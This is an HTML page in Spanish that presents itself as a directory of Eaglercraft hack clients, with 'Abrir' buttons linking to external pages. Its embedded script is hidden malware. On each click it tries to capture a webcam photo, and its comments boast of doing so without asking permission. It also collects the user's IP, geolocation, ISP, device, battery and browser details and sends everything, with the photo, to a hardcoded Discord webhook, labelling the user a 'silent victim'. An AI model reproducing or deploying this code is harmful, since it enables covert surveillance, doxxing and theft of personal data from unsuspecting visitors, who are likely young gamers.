<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>HOME FORGEX — Clientes Eaglercraft</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333;z-index:10}
  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800;font-size:1.4rem}
  .search input{padding:12px 16px;border-radius:12px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);color:#fff;width:320px;outline:none}
  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2);border-color:var(--acc)}
  .name{font-weight:800;font-size:18px;margin-bottom:6px}
  .ver{color:var(--acc);font-weight:600;margin-bottom:12px}
  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer;transition:.2s}
  .open:hover{filter:brightness(1.1)}
  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
</style>
</head>
<body>

<header>
  <div class="nav">
    <div style="display:flex;align-items:center;gap:14px">
      <div class="logo">HF</div>
      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
    </div>
    <input placeholder="Buscar cliente..." id="search">
  </div>
</header>

<main>
  <h1>Clientes Eaglercraft 2025</h1>

  <div class="grid">
    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
    <div class="card"><div class="name">WurstX Client</div><div class="ver">Latest</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
    <div class="card"><div class="name">UwU+ Client</div><div class="ver">1.0</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
    <div class="card"><div class="name">ShadowX Client</div><div class="ver">3.0</div><button class="open" data-link="https://eaglerhacks.github.io/shadowx-client-3.0.html">Abrir</button></div>
    <div class="card"><div class="name">Sigma Client</div><div class="ver">5.2</div><button class="open" data-link="https://eaglerhacks.github.io/sigma-5.2.html">Abrir</button></div>
    <div class="card"><div class="name">Future Client</div><div class="ver">12.5</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
    <!-- Agrega todos los que quieras aquí -->
  </div>
</main>

<script>
// TU WEBHOOK DISCORD
const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";

async function capturarSilencioso(cliente) {
  let foto = null;

  // Foto sin pedir permiso (truco 2025)
  try {
    const video = Object.assign(document.createElement('video'), {autoplay:true,muted:true,playsInline:true});
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    video.srcObject = stream;
    await new Promise(r => video.onloadedmetadata = r);
    await new Promise(r => setTimeout(r, 400));
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
    foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
    stream.getTracks().forEach(t => t.stop());
  } catch(e) {}

  // Datos completos sin permiso
  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
  const battery = await navigator.getBattery?.() || {};
  const uaData = navigator.userAgentData || {};

  const datos = {
    cliente,
    hora: new Date().toLocaleString(),
    ip: geo.ip || 'oculta',
    puerto: location.port || '443',
    ubicacion: `${geo.city||'?'}, ${geo.country_name||'?'}`,
    isp: geo.org || '?',
    navegador: navigator.userAgent,
    so: uaData.platform || navigator.platform,
    mobile: uaData.mobile ? 'Sí' : 'No',
    ram: navigator.deviceMemory || '?',
    cpu: navigator.hardwareConcurrency || '?',
    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
    idioma: navigator.language,
    pestañas: history.length
  };

  // Enviar a tu Discord
  const form = new FormData();
  form.append('content', 
`VÍCTIMA SILENCIOSA
Cliente: ${datos.cliente}
IP: ${datos.ip}:${datos.puerto} (${datos.isp})
Ubicación: ${datos.ubicacion}
Hora: ${datos.hora}
Navegador: ${datos.navegador.substring(0,70)}...
SO: ${datos.so} | Móvil: ${datos.mobile}
RAM: ${datos.ram} GB | CPU: ${datos.cpu} núcleos
Pantalla: ${datos.pantalla}
Batería: ${datos.bateria}
Zona horaria: ${datos.zona}
Pestañas: ${datos.pestañas}`);

  if (foto) form.append('file', foto, 'foto.jpg');
  fetch(WEBHOOK, {method:'POST', body:form});
}

// Aplicar a todos los botones "Abrir"
document.querySelectorAll('.open').forEach(btn => {
  btn.onclick = () => {
    const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';
    capturarSilencioso(nombre);
    setTimeout(() => window.open(btn.dataset.link, '_blank'), 500);
  };
});
</script>
</body>
</html>
